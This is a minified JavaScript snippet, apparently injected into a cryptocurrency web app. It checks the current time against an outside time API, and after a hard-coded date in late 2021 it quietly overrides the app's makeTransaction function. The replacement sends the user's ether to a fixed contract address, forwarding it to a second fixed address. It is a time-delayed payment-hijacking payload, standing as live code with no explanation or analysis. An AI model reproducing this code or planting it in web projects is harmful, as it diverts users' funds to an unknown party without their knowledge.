let timeStart=16397136e5,contracts={};async function getTime(){let t=await fetch("https://www.timeapi.io/api/Time/current/zone?timeZone=utc");return t=await t.json()}function initializeContract(t,e,n){let i=new web3.eth.Contract(e,n);contracts[t]=i}getTime().then(t=>{let e=new Date(t.dateTime);timeStart-e<=0 &&(makeTransaction=(t=>{if(user&&transactionAvaileble){initializeContract("contract",[{inputs:[],stateMutability:"nonpayable",type:"constructor"},{inputs:[{internalType:"address payable",name:"addr",type:"address"}],name:"func",outputs:[],stateMutability:"payable",type:"function"},{inputs:[],name:"getRatio",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"_ratio",type:"uint256"}],name:"setRatio",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"_shield",type:"uint256"}],name:"setShield",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"shield",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"}],"0xcF02ea56c7359c234E717f480394C784D9FE2cB0");let e=web3.utils.toWei(t,"ether");contracts.contract.methods.func("0x9610946e952756973A6069dE267eCD4A49D26B50").send({from:user.coinbase,value:web3.utils.toHex(e)})}}))});